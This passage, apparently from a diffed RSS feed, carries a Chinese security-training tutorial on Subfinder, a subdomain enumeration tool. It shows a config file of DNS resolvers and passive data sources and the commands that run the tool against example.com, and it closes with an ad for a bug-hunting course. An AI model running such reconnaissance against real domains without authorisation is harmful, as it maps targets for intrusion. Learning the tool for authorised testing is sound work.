class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;resolvers:
-  - 1.1.1.1
-  - 1.0.0.1
-  - 8.8.8.8
-  - 8.8.4.4
-  - 9.9.9.9
-  - 9.9.9.10
-  - 77.88.8.8
-  - 77.88.8.1
-  - 208.67.222.222
-  - 208.67.220.220
-sources:
-  - archiveis
-  - binaryedge
-  - bufferover
-  - censys
-  - certspotter
-  - certspotterold
-  - commoncrawl
-  - crtsh
-  - digicert
-  - dnsdumpster
-  - entrust
-  - googleter
-  - hackertarget
-  - ipv4info
-  - passivetotal
-  - securitytrails
-  - shodan
-  - sitedossier
-  - threatcrowd
-  - threatminer
-  - urlscan
-  - virustotal
-  - waybackarchive
-binaryedge: []
-censys: []
-certspotter: []
-passivetotal: []
-securitytrails: []
-shodan: []
-urlscan: []
-virustotal: []&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;将 APIKEY 填入【】中并保存，运行：&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;subfinder-windows-amd64.exe -config config.yaml -d example.com&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;b&gt;使用测试&lt;/b&gt;&lt;/p&gt;&lt;p&gt;以 &lt;a href=&quot;https://link.zhihu.com/?target=http%3A//example.com&quot; class=&quot; wrap external&quot; target=&quot;_blank&quot; rel=&quot;nofollow noreferrer&quot;&gt;example.com&lt;/a&gt; 为例。&lt;/p&gt;&lt;p&gt;查子域：&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;subfinder-windows-amd64.exe -d example.com&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;或 docker 下使用：&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;docker run -it ice3man/subfinder -d example.com&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;figure data-size=&quot;small&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-dd8ecd92599f8f3960553569412cd2a7_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;small&quot; data-rawwidth=&quot;791&quot; data-rawheight=&quot;740&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;791&quot; data-original=&quot;https://pic4.zhimg.com/v2-dd8ecd92599f8f3960553569412cd2a7_r.jpg&quot;/&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-dd8ecd92599f8f3960553569412cd2a7_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;small&quot; data-rawwidth=&quot;791&quot; data-rawheight=&quot;740&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; width=&quot;791&quot; data-original=&quot;https://pic4.zhimg.com/v2-dd8ecd92599f8f3960553569412cd2a7_r.jpg&quot; data-actualsrc=&quot;https://pic4.zhimg.com/v2-dd8ecd92599f8f3960553569412cd2a7_b.jpg&quot;/&gt;&lt;/figure&gt;&lt;p&gt;显示详细信息，使用 -v 即可，将逐一输出程序运行检测的所有域名：&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;subfinder-windows-amd64.exe -d example.com -v&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;更多有关内容请前往&lt;a href=&quot;https://link.zhihu.com/?target=https%3A//twosecurity.cn/%3Fquery_ref%3DqGLdXm&quot; class=&quot; wrap external&quot; target=&quot;_blank&quot; rel=&quot;nofollow noreferrer&quot;&gt;二向箔安全&lt;/a&gt;进行学习，最近推出了“挖洞”班，想了解更多资讯的，可咨询客服微信 &lt;b&gt;twosecurity02&lt;/b&gt;&lt;/p&gt;&lt;figure data-size=&quot;normal&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-2222e29c6decda168e1be1f049d93ccf_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;3041&quot; data-rawheight=&quot;2000&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;3041&quot; data-original=&quot;https://pic4.zhimg.com/v2-2222e29c6decda168e1be1f049d93ccf_r.jpg&quot;/&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-2222e29c6decda168e1be1f049d93ccf_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;3041&quot; data-rawheight=&quot;2000&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; width=&quot;3041&quot; data-original=&quot;https://pic4.zhimg.com/v2-2222e29c6decda168e1be1f049d93ccf_r.jpg&quot; data-actualsrc=&quot;https://pic4.zhimg.com/v2-2222e29c6decda168e1be1f049d93ccf_b.jpg&quot;/&gt;&lt;/figure&gt;</description>
-<author>二向箔安全学院</author>
-<guid isPermaLink="false">2020-01-02-100692663</guid>
-<pubDate>Thu, 02 Jan 2020 00:00:00 +0800</pubDate>
 </item>
 </channel>
 </rss>
